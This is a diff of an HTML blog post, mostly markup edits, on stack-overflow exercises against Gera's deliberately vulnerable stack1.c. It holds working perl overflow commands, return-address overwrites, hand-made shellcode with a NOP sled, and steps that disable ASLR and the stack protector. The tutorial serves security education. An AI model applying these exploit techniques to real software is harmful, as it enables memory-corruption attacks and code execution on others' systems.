@@ -21,39 +21,6 @@
     <link rel="stylesheet" type="text/css" href="/static/css/style.md.css" media="screen" />
    </head>
   <body>
-    <style>
-      .collapsible {
-        cursor: pointer;
-        -webkit-user-select: none;
-        -moz-user-select: none;
-        -ms-user-select: none;
-        user-select: none;
-        width: 100%;
-        border: none;
-        text-align: left;
-        outline: none;
-        cursor: pointer;
-      }
-      .collapsible:after {
-        content: "+";
-        transition: transform .3s ease;
-        display: inline-block;
-        font-weight: bold;
-        float: right;
-      }
-      .expanded::after {
-        content: "-";
-        -ms-transform: rotate(360deg);
-        -webkit-transform: rotate(360deg);
-        transform: rotate(360deg);
-      }
-      .nested {
-        display: none;
-      }
-      .active {
-        display: block;
-      }
-    </style>
     <div class="header">
       <table>
         <tr>
@@ -66,12 +33,13 @@
     </div>
     <div class="body">
           <h1 class="h1 collapsible" onclick="toggle(this);">Gera's Warming Up on Stack #1 - Solutions</h1>
-                  <p class="nested"><a href="/posts/20120710_exploit-mitigation-techniques-on-linux.html"> « </a>📅 published on <code>27/Aug/2012</code><a href="/posts/20120902_soritong-m3u-seh-overflow.html"> » </a></p>
-                <p class="nested">This is the part 1 in a series of posts that aim to provide an analysis and possible solutions for the vulnerable programs provided by Gera at his Insecure Programming by example page.</p>
+                  <p><a href="/posts/20120710_exploit-mitigation-techniques-on-linux.html"> « </a>📅 published on <code>27/Aug/2012</code><a href="/posts/20120902_soritong-m3u-seh-overflow.html"> » </a></p>
+                <h2 class="h2 collapsible" onclick="toggle(this);">Introduction</h2>
+<p class="nested">This is the part 1 in a series of posts that aim to provide an analysis and possible solutions for the vulnerable programs provided by Gera at his Insecure Programming by example page.</p>
 <p class="nested">Familiarity with exploit mitigation techniques is expected to gain a proper understanding of the concepts we talk about here. If terms like <code>ASLR</code>, <code>NX</code>, <code>SSP</code>, <code>RELRO</code>, etc. seem unfamiliar, I would suggest reading the <a href="https://7h3ram.github.io/posts/20120710_exploit-mitigation-techniques-on-linux.html">Exploit Mitigation Techniques on Linux Systems</a> post that talks about these.</p>
 <p class="nested">We will start with a scenario in which most of the exploit mitigation techniques will be enabled through the default GCC compilation command-line. Since, these techniques prevent successful exploit attempts, we will incrementally turn them off until successful exploitation is achieved. This setup will allow us to witness how these individual techniques succeed in restricting exploit attempts and how their absence affects exploitation reliability.</p>
 <p class="nested">Below is the source for the vulnerable <a href="http://community.corest.com/%7Egera/InsecureProgramming/stack1.html">stack1.c</a> program:</p>
-<p class="nested"re><code class="c">/* stack1.c                                     *
+<pre class="nested"><code class="c">/* stack1.c                                     *
  * specially crafted to feed your brain by gera */
 
 int main() {
@@ -90,7 +58,7 @@ int main() {
 <p class="nested">Here are a few observations that could be made by looking at the source of the program:</p>
 <ol class="nested">
 <li>Since it is defined prior to buf, the cookie would be placed at a higher memory address on the program stack, just below the saved registers from the function prologue</li>
-<li>The <code>buf</code> character array would be at an offset of at least 80B from <code>cookie</code></li>
+<li>The <code>buf</code> character array would be at an offset of at least <code>80B</code> from <code>cookie</code></li>
 <li>The <code>gets</code> call would accept unbounded user-input within <code>buf</code> array and hence it provides a mechanism to alter the call stack contents.</li>
 </ol>
 <p class="nested">To attempt exploitation, proper understanding of a program's memory layout and the positioning of its metadata is very important. We first need to understand the <a href="http://www.csee.umbc.edu/%7Echang/cs313.s02/stack.shtml">call stack</a> for the <code>stack1</code> program.</p>
@@ -104,13 +72,13 @@ int main() {
 <p class="nested"><img alt="image" src="/static/files/posts_geras_wuos_stack1_solutions/stack1-callstack-raw.png" /></p>
 <p class="nested">NOTE: The stack is assumed to be 4B aligned and we are working on an x86 machine. The addresses in the layouts are for reference only.While thinking about possible solutions for this program, I came up with the below listed ideas:</p>
 <ul class="nested">
-<li>Solution #1: Overflow the 4B past <code>buf</code>, where the <code>cookie</code> is stored, with the desired value (<code>0x41424344</code> in this case)</li>
+<li>Solution #1: Overflow the <code>4B</code> past <code>buf</code>, where the <code>cookie</code> is stored, with the desired value (<code>0x41424344</code> in this case)</li>
 <li>Solution #2: Overwrite EIP with the address of the <code>printf</code> statement that prints the <code>you win!</code> message</li>
 <li>Solution #3: Inject and execute a shellcode that simulates the second <code>printf</code> statement, through the internal <code>buf</code> character array</li>
 <li>Solution #4: Inject and execute a shellcode, that simulates the second <code>printf</code> statement, through an environment variable and overwrite EIP with its address</li>
 </ul>
 <p class="nested">All right! Let's start with the test execution of this program. Here's a brief description of the test system:</p>
-<p class="nested"re><code># cat /etc/lsb-release | grep DESC
+<pre class="nested"><code># cat /etc/lsb-release | grep DESC
 DISTRIB_DESCRIPTION=&quot;Ubuntu 9.04&quot;
 #
 # uname -a | cut -d&quot; &quot; -f1,3,12,13
@@ -126,8 +94,8 @@ model name  : Intel(R) Core(TM) i5-4200M CPU @ 2.50GHz
 flags   : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 syscall nx rdtscp lm constant_tsc up xtopology pni pclmulqdq monitor ssse3 cx16 sse4_1 sse4_2 aes xsave avx lahf_lm abm
 </code></pre>
 
-<p class="nested">Below is the GCC command-line to compile the <code>stack1.c</code> source file. The <code>-mpreferred-stack-boundary=2</code> option is used to align stack entries at QWORD (8B) boundary:</p>
-<p class="nested"re><code># gcc -mpreferred-stack-boundary=2 -o stack1 stack1.c
+<p class="nested">Below is the GCC command-line to compile the <code>stack1.c</code> source file. The <code>-mpreferred-stack-boundary=2</code> option is used to align stack entries at QWORD (<code>8B</code>) boundary:</p>
+<pre class="nested"><code># gcc -mpreferred-stack-boundary=2 -o stack1 stack1.c
 stack1.c: In function ‘main’:
 stack1.c:8: warning: incompatible implicit declaration of built-in function ‘printf’
 stack1.c:8: warning: format ‘%08x’ expects type ‘unsigned int’, but argument 2 has type ‘char (*)[80]’
@@ -136,9 +104,9 @@ stack1.c:8: warning: format ‘%08x’ expects type ‘unsigned int’, but argu
 stack1.c:(.text+`0x32`): warning: the `gets' function is dangerous and should not be used.
 </code></pre>
 
-<p class="nested">GCC outlines a few warnings with the above code, out of which, the last one suggests to find an alternative for the gets, since it is a <em>dangerous</em> function. We are in the process of figuring out just how dangerous <code>gets</code> can be and hence we can ignore this and earlier warnings.</p>
+<p class="nested">GCC outlines a few warnings with the above code, out of which, the last one suggests to find an alternative for the gets, since it is a <code>dangerous</code> function. We are in the process of figuring out just how dangerous <code>gets</code> can be and hence we can ignore this and earlier warnings.</p>
 <p class="nested">Lets have a peak into the assembly code of the stack1 ELF binary. Below command-line uses the objdump utility to dump the disassembled object code of a program in <a href="http://asm.sourceforge.net/articles/linasm.html#Syntax">Intel</a> syntax (remove the <code>-Mintel</code> option from the below command-line to view AT&amp;T syntax formatted assembled code):</p>
-<p class="nested"re><code class="nasm"># objdump -d -Mintel stack1 | grep -A30 main.:
+<pre class="nested"><code class="nasm"># objdump -d -Mintel stack1 | grep -A30 main.:
 08048484 &lt;main&gt;:
  8048484: 55                    push   ebp
  8048485: 89 e5                 mov    ebp,esp
@@ -175,14 +143,16 @@ stack1.c:(.text+`0x32`): warning: the `gets' function is dangerous and should no
 <p class="nested">There are a few very important points to note from the above output:</p>
 <ol class="nested">
 <li>To witness the <a href="http://en.wikipedia.org/wiki/Buffer_overflow_protection#GCC_Stack-Smashing_Protector_.28ProPolice.29">SSP</a> mitigation technique, locate the <code>mov eax, gs:0x14</code> instruction at memory address <code>0x080484aa</code>. This instruction inserts a random 4B canary value just below the function prologue.</li>
-<li>Variable reordering feature of SSP is also in place since for the initial <code>printf</code> call, the first variable to be pushed on to stack is <code>&amp;cookie</code> instead of <code>&amp;buf</code> (refer <a href="http://en.wikipedia.org/wiki/X86_calling_conventions#cdecl">cdecl</a> calling convention). This is concluded from the addresses used to move arguments onto stack. The <code>&amp;cookie</code> is accessed from the location <code>[ebp-0x58]</code> and <code>&amp;buf</code> from <code>[ebp-0x54]</code>. As such, cookie is placed at a distance of 88B from EBP and <code>buf</code> is located right above it at a distance of 84B from EBP. The additional 4B are from the canary placed inbetween <code>buf</code> and EBP.</li>
+<li>Variable reordering feature of SSP is also in place since for the initial <code>printf</code> call, the first variable to be pushed on to stack is <code>&amp;cookie</code> instead of <code>&amp;buf</code> (refer <a href="http://en.wikipedia.org/wiki/X86_calling_conventions#cdecl">cdecl</a> calling convention). This is concluded from the addresses used to move arguments onto stack. The <code>&amp;cookie</code> is accessed from the location <code>[ebp-0x58]</code> and <code>&amp;buf</code> from <code>[ebp-0x54]</code>. As such, cookie is placed at a distance of <code>88B</code> from EBP and <code>buf</code> is located right above it at a distance of 84B from EBP. The additional 4B are from the canary placed inbetween <code>buf</code> and EBP.</li>
 <li>The code to verify the content of canary, before returning control to the parent process, is also added and can be found at address <code>0x080484f0</code>. If this check fails, the <code>__stack_chk_fail</code> function is called to abort the execution of this program.</li>
 </ol>
-<p class="nested"><strong>NOTE</strong>: These SSP features are enabled by default and hence were introduced automatically through the vanilla command-line we used to compile <code>stack1.c</code> above. It is, however, suggested to use explicit command-line arguments without considering their default status when compiling your source files. This ensures portability of security checks in your applications.</p>
+<blockquote>
+<p class="nested">These SSP features are enabled by default and hence were introduced automatically through the vanilla command-line we used to compile <code>stack1.c</code> above. It is, however, suggested to use explicit command-line arguments without considering their default status when compiling your source files. This ensures portability of security checks in your applications.</p>
+</blockquote>
 <p class="nested">You must have already guessed that the call stack layout we saw earlier is no longer in sync with the compiled binary. We need to recreate it considering the above discussed modifications:</p>
 <p class="nested"><img alt="stack1-callstack.png" src="/static/files/posts_geras_wuos_stack1_solutions/stack1-callstack.png" /></p>
 <p class="nested">The default GCC command-line might have turned on other mitigation features as well. We need to investigate further before proceeding. <a href="http://www.trapkit.de/about.html">Tobias Klein</a>, the author of <a href="http://www.trapkit.de/books/bhd/en.html">A Bug Hunter's Diary</a>, maintains an awesome Bash script called <a href="http://www.trapkit.de/tools/checksec.html">checksec.sh</a> that provides an overview of the security features implemented within the Linux kernel, ELF binaries and executing processes on a system. Here is a listing of its available options:</p>
-<p class="nested"re><code>$ ./checksec.sh
+<pre class="nested"><code>$ ./checksec.sh
 Usage: checksec [OPTION]
 
 Options:
@@ -203,7 +173,7 @@ For more information, see:
 </code></pre>
 
 <p class="nested">Obtain the latest version of this script (1.5 as of this writing). Let's try the <code>--kernel</code> option to see available mitigation features implemented within the kernel on the test system:</p>
-<p class="nested"re><code># ./checksec.sh --kernel
+<pre class="nested"><code># ./checksec.sh --kernel
 * Kernel protection information:
 
   Description - List the status of kernel protection mechanisms. Rather than
@@ -233,7 +203,7 @@ For more information, see:
 </code></pre>
 
 <p class="nested">The output above confirms that the GCC stack protector support is enabled and we have already seen it in action earlier. Let's now see what does this script has to say about the <code>stack1</code> ELF binary:</p>
-<p class="nested"re><code># ./checksec.sh --file stack1
+<pre class="nested"><code># ./checksec.sh --file stack1
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
 Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   stack1
 # ./checksec.sh --fortify-file stack1
@@ -257,8 +227,8 @@ SUMMARY:
 * Number of unchecked functions in the executable    : 4
 </code></pre>
 
-<p class="nested">As discussed earlier, the default compilation command-line enabled quite a few mitigation features like <code>Partial RELRO</code>, <code>stack canary</code>, <code>NX</code> and a few others. These features have made significant modifications to the vulnerable program and their presence will prohibit its successful exploitation. From the above output, also note that the <code>printf</code> and <code>gets</code> functions have not been replaced with their safer counterparts. This should have happened through the default command-line. But since the program source did not include the necessary standard libraries for these functions, the <code>FORTIFY_SOURCE</code> mitigation feature failed to detect their presence and as such could not replace them. If you recompile the source with the necessary libraries included, you will encounter the <em>stack smashing detected</em> error message. Even in the absence of this feature, the ELF binary is quite difficult to exploit. We need to print the <code>you win!</code> message to successfully exploit this program. But since the <code>cookie</code> has been reordered and placed below <code>buf</code>, we simply have no way to modify it. Additionally, any attempts to overwrite the return address would fail since the canary is placed in between. While overwriting EIP, it will also be overwritten and the <code>__stack_chk_fail</code> function would terminate the program before the message is printed:</p>
-<p class="nested"re><code># perl -e 'print &quot;A&quot;x81' | ./stack1
+<p class="nested">As discussed earlier, the default compilation command-line enabled quite a few mitigation features like <code>Partial RELRO</code>, <code>stack canary</code>, <code>NX</code> and a few others. These features have made significant modifications to the vulnerable program and their presence will prohibit its successful exploitation. From the above output, also note that the <code>printf</code> and <code>gets</code> functions have not been replaced with their safer counterparts. This should have happened through the default command-line. But since the program source did not include the necessary standard libraries for these functions, the <code>FORTIFY_SOURCE</code> mitigation feature failed to detect their presence and as such could not replace them. If you recompile the source with the necessary libraries included, you will encounter the <code>stack smashing detected</code> error message. Even in the absence of this feature, the ELF binary is quite difficult to exploit. We need to print the <code>you win!</code> message to successfully exploit this program. But since the <code>cookie</code> has been reordered and placed below <code>buf</code>, we simply have no way to modify it. Additionally, any attempts to overwrite the return address would fail since the canary is placed in between. While overwriting EIP, it will also be overwritten and the <code>__stack_chk_fail</code> function would terminate the program before the message is printed:</p>
+<pre class="nested"><code># perl -e 'print &quot;A&quot;x81' | ./stack1
 buf: bfb94544 cookie: bfb94540
 *** stack smashing detected ***: ./stack1 terminated
 ======= Backtrace: =========
@@ -291,7 +261,7 @@ Aborted
 </code></pre>
 
 <p class="nested">In the above test run, supplying 81B of input causes the program to crash. Note the addresses of <code>buf</code> and <code>cookie</code>, <code>0xbf857bc4</code> and <code>0xbf857bc0</code> respectively. Variable reordering is in effect here since <code>buf</code> is placed at a higher memory address than <code>cookie</code>. We are experiencing the influence of exploit mitigation techniques at this stage. For a successful exploit attempt, we will have to disable these features to be able to achieve exploitation. Let's disable the stack canary mitigation feature first. Below output shows the GCC option <code>-fno-stack-protector</code>, that disables SSP and as such provides a wide playground for our exploit attempts. Additionally, we see how the <code>checksec.sh</code> script correctly identifies the absence of stack canary and fortify source mitigation features from the program:</p>
-<p class="nested"re><code># gcc -mpreferred-stack-boundary=2 -fno-stack-protector -o stack1 stack1.c
+<pre class="nested"><code># gcc -mpreferred-stack-boundary=2 -fno-stack-protector -o stack1 stack1.c
 stack1.c: In function ‘main’:
 stack1.c:8: warning: incompatible implicit declaration of built-in function ‘printf’
 stack1.c:8: warning: format ‘%08x’ expects type ‘unsigned int’, but argument 2 has type ‘char (*)[80]’
@@ -308,7 +278,7 @@ buf: bfbb8bf4 cookie: bfbb8c44
 </code></pre>
 
 <p class="nested">The <code>buf</code> is at <code>0xbfa68294</code> and the cookie at <code>0xbfa682e4</code>. The variables have been ordered as per our expectation. Let's have a peek at the program assembly to quickly see if the stack cookie has also been added or not:</p>
-<p class="nested"re><code class="nasm"># objdump -d -Mintel stack1 | grep -A20 main.:
+<pre class="nested"><code class="nasm"># objdump -d -Mintel stack1 | grep -A20 main.:
 08048424 &lt;main&gt;:
  8048424: 55                    push   ebp
  8048425: 89 e5                 mov    ebp,esp
@@ -333,9 +303,9 @@ buf: bfbb8bf4 cookie: bfbb8c44
 </code></pre>
 
 <p class="nested">From here we could proceed to the exploitation phase.</p>
-<h2 class="h2 collapsible" onclick="toggle(this);">Solution #1: Overflow the 4B past buf, where the cookie is stored, with the desired value (<code>0x41424344</code> in this case)</h2>
+<h2 class="h2 collapsible" onclick="toggle(this);">Solution #1: Overflow the <code>4B</code> past buf, where the cookie is stored, with the desired value (<code>0x41424344</code> in this case)</h2>
 <p class="nested">For this solution we first need to calculate the offset between <code>buf</code> and <code>cookie</code>:</p>
-<p class="nested"re><code># ./stack1
+<pre class="nested"><code># ./stack1
 buf: bfad87b4 cookie: bfad8804
 AAAAAAA
 
@@ -343,16 +313,16 @@ AAAAAAA
 offset: 80
 </code></pre>
 
-<p class="nested">As expected, it came out to be 80B. We craft a perl command-line to overwrite 80B of data to reach past the <code>buf</code> boundary. Once this is done, we're pointing at the cookie, which can then be overwritten with the desired content:</p>
-<p class="nested"re><code># perl -e 'print &quot;A&quot;x80 . &quot;\x44\x43\x42\x41&quot;' | ./stack1
+<p class="nested">As expected, it came out to be 80B. We craft a perl command-line to overwrite <code>80B</code> of data to reach past the <code>buf</code> boundary. Once this is done, we're pointing at the cookie, which can then be overwritten with the desired content:</p>
+<pre class="nested"><code># perl -e 'print &quot;A&quot;x80 . &quot;\x44\x43\x42\x41&quot;' | ./stack1
 buf: bfee2d14 cookie: bfee2d64
 you win!
 </code></pre>
 
 <p class="nested"><strong>NOTE</strong>: The test system is a x86 Intel machine that uses <a href="http://isisblogs.poly.edu/2012/05/28/endianness/">little-endian</a> byte ordering. We take this into account and reorder individual bytes to set the <code>cookie</code> with appropriate value.</p>
-<h2 class="h2 collapsible" onclick="toggle(this);">Solution #2: Overwrite EIP with the address of the printf statement that prints the you win! message</h2>
+<h2 class="h2 collapsible" onclick="toggle(this);">Solution #2: Overwrite EIP with the address of the <code>printf</code> statement that prints the <code>you win!</code> message</h2>
 <p class="nested">For the second solution, we need to overwrite EIP with the address of the <code>printf</code> statement that prints the required <code>you win!</code> message. This will ensure that when the program returns from <code>main()</code>, control transfers to stack1's <code>.text</code> segment instead of the <code>__libc_start_main()</code>. But first we need to find the address of the <code>printf</code> statement from <code>stack1</code>'s assembly code:</p>
-<p class="nested"re><code class="nasm"># objdump -d -Mintel stack1 | grep -A20 main.:
+<pre class="nested"><code class="nasm"># objdump -d -Mintel stack1 | grep -A20 main.:
 08048424 &lt;main&gt;:
  8048424: 55                    push   ebp
  8048425: 89 e5                 mov    ebp,esp
@@ -377,24 +347,24 @@ you win!
 </code></pre>
 
 <p class="nested">The last call instruction prepares the stack for a call to <code>puts</code>. That's right, the stack is prepared for <code>puts</code> and not <code>printf</code>. This is due to a default <a href="http://www.ciselant.de/projects/gcc_printf/gcc_printf.html">GCC optimization option</a> that finds the second <code>printf</code> call in <code>stack1.c</code> incompatible with its built-in declaration and replaces (optimizes) it with a call to <code>puts</code>. For our exploit attempts, we can safely ignore the implicit differences between functions used here. Since the <code>puts</code> function will do the same thing as <code>printf</code>, we just want its address for proper control transfer. However we need the address of the instruction just above call <code>puts</code> as well, because it is where the <code>you win!</code> message is pushed onto the stack. From the above output we see that it is <code>0x08048479</code>.</p>
-<p class="nested">Now that we have the address to overwrite with, we need the exact offset where we can inject it. For this solution we need to overwrite EIP, whereas in the previous solution, we overwrote cookie, ie. 4B past buf. The size of <code>buf</code> was the offset that we used for junk data to reach <code>cookie</code>. We concluded this offset using the variable adjacency property. All local variables are placed adjacent to each other at lower memory addresses in the order in which they were declared in the source program. As such we could find out the offset of the EIP as well.</p>
-<p class="nested">Referring the call stack layout we saw earlier, the offset of EIP can be easily calculated. The <code>buf</code> 80B + cookie 4B + saved Frame Pointer 4B = 88B. This is the offset of EIP from the start of the <code>buf</code> array:</p>
-<p class="nested"re><code># perl -e 'print &quot;A&quot;x88 . &quot;\x59\x84\x04\x08&quot;' | ./stack1
+<p class="nested">Now that we have the address to overwrite with, we need the exact offset where we can inject it. For this solution we need to overwrite EIP, whereas in the previous solution, we overwrote cookie, ie. <code>4B</code> past <code>buf</code>. The size of <code>buf</code> was the offset that we used for junk data to reach <code>cookie</code>. We concluded this offset using the variable adjacency property. All local variables are placed adjacent to each other at lower memory addresses in the order in which they were declared in the source program. As such we could find out the offset of the EIP as well.</p>
+<p class="nested">Referring the call stack layout we saw earlier, the offset of EIP can be easily calculated. The <code>buf 80B</code> + <code>cookie 4B</code> + <code>saved Frame Pointer 4B</code> = <code>88B</code>. This is the offset of EIP from the start of the <code>buf</code> array:</p>
+<pre class="nested"><code># perl -e 'print &quot;A&quot;x88 . &quot;\x59\x84\x04\x08&quot;' | ./stack1
 buf: bfebf464 cookie: bfebf4b4
 you win!
 Segmentation fault
 </code></pre>
 
 <p class="nested">We were able to overwrite EIP and redirect control to a desired location. This action helped us to bypass the if condition without actually modifying the contents of the source program.</p>
-<h2 class="h2 collapsible" onclick="toggle(this);">Solution #3: Inject and execute a shellcode that simulates the second printf statement, through the internal buf character array</h2>
+<h2 class="h2 collapsible" onclick="toggle(this);">Solution #3: Inject and execute a shellcode that simulates the second <code>printf</code> statement, through the internal <code>buf</code> character array</h2>
 <p class="nested">We now move on to the third solution for this program. We have found that the program has a buffer in which we can inject junk data and we also have the ability to redirect control to arbitrary locations. These two possibilities, when combined together, allow us to execute arbitrary shellcode. We will design a shellcode that simulates the behavior of the <code>puts</code> call and inject it within the program buffer. We will then modify the contents of EIP to point to the buffer where our injected shellcode ends up. If all goes well, this shellcode will be executed and we will have the message printed.There is however one thing we will have to think about before we move ahead. Recall the <code>checksec.sh</code> output above. It tells that one of the mitigation features, <code>NX</code>, is enabled for the vulnerable <code>stack1</code> program. This means that when we execute this binary, it will have its stack segment marked as non-executable:</p>
-<p class="nested"re><code># readelf -l stack1 | grep -i gnu_stack
+<pre class="nested"><code># readelf -l stack1 | grep -i gnu_stack
   GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x4
 </code></pre>
 
 <p class="nested">From the above output, stack is marked as <code>RW</code> for the vulnerable program. As such, even if we can inject (write) shellcode into <code>buf</code>, we can not execute it. Any attempts to redirect EIP to our shellcode would be successful, however, the instant we try to execute shellcode, an exception would be raised that will eventually terminate the program. So, we'll have to disable this feature for solutions #3 and #4 to work correctly. But I'm not going to disable them for now. As you'll see, our exploit attempts would still work in the presence of <code>NX</code> and at the end of the post I'll point out the exact reason for such a behavior. Till then read on and try to think about why this might be happening.</p>
 <p class="nested">First we need to design a shellcode that simulates the <code>puts</code> call. I came up with the following:</p>
-<p class="nested"re><code># cat -n printf.s
+<pre class="nested"><code># cat -n printf.s
      1  # printf.s
      2  # sample program to print &quot;you win!\n&quot; message to stdout
      3
@@ -428,14 +398,14 @@ Segmentation fault
 </code></pre>
 
 <p class="nested">The above code uses the standard Linux system calls, <code>write</code> and <code>exit</code>, to print the message and cleanly terminate the program. Using the <code>exit</code> call will help us to get rid of the annoying segmentation fault we encountered in the previous solution. Additionally, we also use a few shellcode writing tricks to remove NULL bytes from our shellcode, reducing its size and overcoming the addressing problem. Assemble and link the program to create a standalone binary:</p>
-<p class="nested"re><code># as -o printf.o printf.s
+<pre class="nested"><code># as -o printf.o printf.s
 # ld -o printf printf.o
 # ./printf
 you win!
 </code></pre>
 
 <p class="nested">Here is the objdump for the resultant <code>printf</code> program:</p>
-<p class="nested"re><code class="nasm"># objdump -d -Mintel printf
+<pre class="nested"><code class="nasm"># objdump -d -Mintel printf
 
 printf:     file format elf32-i386
 
@@ -470,14 +440,14 @@ Disassembly of section .text:
 </code></pre>
 
 <p class="nested">Extract opcodes to create the required shellcode and calculate its size:</p>
-<p class="nested"re><code># perl -e 'print &quot;\xeb\x16\x31\xc0\x31\xdb\x31\xd2\xb0\x04\xb3\x01\x59\xb2\x09\xcd\x80\x31\xc0\x40\x31\xdb\xcd\x80\xe8\xe5\xff\xff\xff\x79\x6f\x75\x20\x77\x69\x6e\x21\x0a&quot;' &gt;shellcode.bin
+<pre class="nested"><code># perl -e 'print &quot;\xeb\x16\x31\xc0\x31\xdb\x31\xd2\xb0\x04\xb3\x01\x59\xb2\x09\xcd\x80\x31\xc0\x40\x31\xdb\xcd\x80\xe8\xe5\xff\xff\xff\x79\x6f\x75\x20\x77\x69\x6e\x21\x0a&quot;' &gt;shellcode.bin
 #
 # ls -lh shellcode.bin
 -rw-r--r-- 1 seed seed 38 2012-08-27 02:41 shellcode.bin
 </code></pre>
 
 <p class="nested">Now we are ready with the shellcode that simulates the <code>puts</code> call. Once we inject it, we would need the address of the buffer where this shellcode will eventually land. Looking at the source and through the earlier test executions of the <code>stack1</code> program, you already know that it prints out the address of the <code>buf</code> and the <code>cookie</code> variables. But we cannot just use the address from an earlier execution for our exploit. Why is this so? If you had noticed earlier, both <code>buf</code> and <code>cookie</code>, although adjacent and aligned as expected, had different address on each invocation:</p>
-<p class="nested"re><code># ./stack1
+<pre class="nested"><code># ./stack1
 buf: bfc21614 cookie: bfc21664
 AAAA
 #
@@ -492,7 +462,7 @@ AAAA
 </code></pre>
 
 <p class="nested">You would have already guessed by now. It is due to the <code>ASLR</code> mitigation feature that is active on the test system:</p>
-<p class="nested"re><code># cat /proc/sys/kernel/randomize_va_space
+<pre class="nested"><code># cat /proc/sys/kernel/randomize_va_space
 2
 #
 # ./checksec.sh --proc init
@@ -510,8 +480,8 @@ AAAA
             init      1 Full RELRO        Canary found           NX enabled    PIE enabled
 </code></pre>
 
-<p class="nested">On systems that support <a href="https://wiki.ubuntu.com/Security/Features#brk_ASLR">brk</a> <a href="https://wiki.ubuntu.com/Security/Features#Address_Space_Layout_Randomisation_.28ASLR.29">ASLR</a>, the <code>/proc/sys/kernel/randomize_va_space</code> file stores a value of 2. On other systems it stores a value of 1 by default to indicate the presence of vanilla <code>ASLR</code>. Modifying this file with a value of 0 will immediately turn off this feature for all newly spawned processes:</p>
-<p class="nested"re><code># cat /proc/sys/kernel/randomize_va_space
+<p class="nested">On systems that support <a href="https://wiki.ubuntu.com/Security/Features#brk_ASLR">brk</a> <a href="https://wiki.ubuntu.com/Security/Features#Address_Space_Layout_Randomisation_.28ASLR.29">ASLR</a>, the <code>/proc/sys/kernel/randomize_va_space</code> file stores a value of <code>2</code>. On other systems it stores a value of <code>1</code> by default to indicate the presence of vanilla <code>ASLR</code>. Modifying this file with a value of <code>0</code> will immediately turn off this feature for all newly spawned processes:</p>
+<pre class="nested"><code># cat /proc/sys/kernel/randomize_va_space
 2
 #
 # echo 0 &gt; /proc/sys/kernel/randomize_va_space
@@ -529,8 +499,8 @@ buf: bffff4d4 cookie: bffff524
 AAAA
 </code></pre>
 
-<p class="nested">For all the 3 invocations of <code>stack1</code> program, the locations for <code>buf</code> (<code>0xbffff4d4</code>) and <code>cookie</code> (<code>0xbffff524</code>) remains constant. Since the <code>buf</code> is always placed at a known static address, we could use it for EIP redirection. Let's proceed to the exploitation phase. Since the shellcode is of size 38B and the <code>buf</code> is located at an offset of 88B from the EIP, we have a junk space of 50B. We could use this space to increase the reliability of our exploit by adding a NOP sled at the start of our shellcode. This although is not required as we are already aware of the location of our shellcode. But we still have to fill this space with junk bytes to reach the offset of EIP. Let's craft a perl command-line to inject our shellcode at the location where this correct address could be overwritten. However, we were not able to get the shellcode executed:</p>
-<p class="nested"re><code>./stack1
+<p class="nested">For all the 3 invocations of <code>stack1</code> program, the locations for <code>buf</code> (<code>0xbffff4d4</code>) and <code>cookie</code> (<code>0xbffff524</code>) remains constant. Since the <code>buf</code> is always placed at a known static address, we could use it for EIP redirection. Let's proceed to the exploitation phase. Since the shellcode is of size 38B and the <code>buf</code> is located at an offset of 88B from the EIP, we have a junk space of <code>50B</code>. We could use this space to increase the reliability of our exploit by adding a NOP sled at the start of our shellcode. This although is not required as we are already aware of the location of our shellcode. But we still have to fill this space with junk bytes to reach the offset of EIP. Let's craft a perl command-line to inject our shellcode at the location where this correct address could be overwritten. However, we were not able to get the shellcode executed:</p>
+<pre class="nested"><code>./stack1
 buf: bffff4d4 cookie: bffff524
 AAAA
 #
@@ -539,7 +509,7 @@ buf: bffff4d4 cookie: bffff524
 </code></pre>
 
 <p class="nested">Sadly, it did not work. The offset calculation was correct, address for EIP overwrite also points to our shellcode, and we actually have a working shellcode that, if executed, should display the winning message. What could have gone wrong? A GDB analysis could help but this specific issue could be debugged without using it. Have a look at the shellcode once again:</p>
-<p class="nested"re><code># hexdump -C shellcode.bin
+<pre class="nested"><code># hexdump -C shellcode.bin
 00000000  eb 16 31 c0 31 db 31 d2  b0 04 b3 01 59 b2 09 cd  |..1.1.1.....Y...|
 00000010  80 31 c0 40 31 db cd 80  e8 e5 ff ff ff 79 6f 75  |.1.@1........you|
 00000020  20 77 69 6e 21 0a                                 | win!.|
@@ -548,7 +518,7 @@ buf: bffff4d4 cookie: bffff524
 
 <p class="nested">The shellcode above is copied into the <code>buf</code> array through the <code>gets</code> function, which parses newline or EoF as input terminating characters. Unfortunately, the shellcode we so carefully prepared contains a newline as its last byte. This came in through the <code>you win!</code> message and it is indeed the culprit here. The earlier exploit command-line breaks at the <code>0x0a</code> byte on offset 87, failing to overwrite further stack locations. The EIP at offset 88 is untouched and we fail to gain successful exploitation.</p>
 <p class="nested">We could quickly modify the <code>printf.s</code> program and generate a new shellcode that has the message with no newline character. However, a quick hack can be to remove the newline from the exploit command-line and test it:</p>
-<p class="nested"re><code># perl -e 'print &quot;\x90&quot;x50 . &quot;\xeb\x16\x31\xc0\x31\xdb\x31\xd2\xb0\x04\xb3\x01\x59\xb2\x09\xcd\x80\x31\xc0\x40\x31\xdb\xcd\x80\xe8\xe5\xff\xff\xff\x79\x6f\x75\x20\x77\x69\x6e\x21\x0a&quot; . &quot;\xd4\xf4\xff\xbf&quot;' | ./stack1
+<pre class="nested"><code># perl -e 'print &quot;\x90&quot;x50 . &quot;\xeb\x16\x31\xc0\x31\xdb\x31\xd2\xb0\x04\xb3\x01\x59\xb2\x09\xcd\x80\x31\xc0\x40\x31\xdb\xcd\x80\xe8\xe5\xff\xff\xff\x79\x6f\x75\x20\x77\x69\x6e\x21\x0a&quot; . &quot;\xd4\xf4\xff\xbf&quot;' | ./stack1
 buf: bffff4d4 cookie: bffff524
 #
 # perl -e 'print &quot;\x90&quot;x51 . &quot;\xeb\x16\x31\xc0\x31\xdb\x31\xd2\xb0\x04\xb3\x01\x59\xb2\x09\xcd\x80\x31\xc0\x40\x31\xdb\xcd\x80\xe8\xe5\xff\xff\xff\x79\x6f\x75\x20\x77\x69\x6e\x21&quot; . &quot;\xd4\xf4\xff\xbf&quot;' | ./stack1
@@ -558,12 +528,12 @@ you win!
 
